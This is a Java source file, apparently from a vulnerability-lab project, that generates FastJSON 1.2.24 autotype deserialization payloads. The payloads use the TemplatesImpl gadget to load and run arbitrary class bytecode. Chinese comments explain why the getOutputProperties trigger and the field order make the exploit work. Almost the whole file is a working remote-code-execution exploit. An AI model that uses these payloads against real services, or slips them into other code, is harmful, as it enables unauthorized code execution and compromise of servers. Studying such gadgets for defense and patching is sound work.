package com.govuln.fastjsonattack;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Field;
import java.util.Base64;

/**
 * FastJSON TemplatesImpl Gadget
 * 利用 FastJSON 的 autotype 机制，通过 TemplatesImpl 执行恶意代码
 */
public class FastJSONTemplatesImpl {
    
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    
    /**
     * 生成基于 TemplatesImpl 的 FastJSON payload
     * @param clazzBytes 恶意类的字节码
     * @return JSON 字符串
     */
    public String getPayload(byte[] clazzBytes) throws Exception {
        // FastJSON 在反序列化时会调用 getter 方法
        // 当解析到 outputProperties 字段时，会调用 getOutputProperties()
        // getOutputProperties() 会调用 newTransformer()，从而加载并实例化恶意类
        
        // FastJSON 1.2.24 支持通过 @type 指定类名进行反序列化
        // 对于私有字段，FastJSON 会通过反射设置（需要开启 Feature.SupportNonPublicField）
        // 但更简单的方式是利用 getter 方法
        
        StringBuilder sb = new StringBuilder();
        sb.append("{");
        sb.append("\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",");
        sb.append("\"_bytecodes\":[\"").append(Base64.getEncoder().encodeToString(clazzBytes)).append("\"],");
        sb.append("\"_name\":\"a\",");
        sb.append("\"_tfactory\":{},");
        // 关键：outputProperties 字段会触发 getOutputProperties() 方法
        sb.append("\"_outputProperties\":{}");
        sb.append("}");
        
        return sb.toString();
    }
    
    /**
     * 生成简化版 payload（利用 getOutputProperties）
     * 这是最常用的方式
     * 
     * 注意：需要服务端开启 Feature.SupportNonPublicField 才能设置私有字段
     */
    public String getPayloadSimple(byte[] clazzBytes) throws Exception {
        // FastJSON 在反序列化时会调用 getter 方法
        // 当解析到 outputProperties 字段时，会调用 getOutputProperties()
        // getOutputProperties() 会调用 newTransformer()，从而加载恶意类
        
        // 关键：字段顺序很重要，先设置 _bytecodes、_name、_tfactory，最后设置 _outputProperties
        // 这样在调用 getOutputProperties() 时，所有必要的字段都已经设置好了
        
        StringBuilder sb = new StringBuilder();
        sb.append("{");
        sb.append("\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",");
        // 先设置字节码
        sb.append("\"_bytecodes\":[\"").append(Base64.getEncoder().encodeToString(clazzBytes)).append("\"],");
        // 设置名称
        sb.append("\"_name\":\"a\",");
        // 设置 TransformerFactoryImpl（需要完整类名）
        sb.append("\"_tfactory\":{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\"},");
        // 最后设置 outputProperties，这会触发 getOutputProperties()
        sb.append("\"_outputProperties\":{}");
        sb.append("}");
        
        return sb.toString();
    }
}

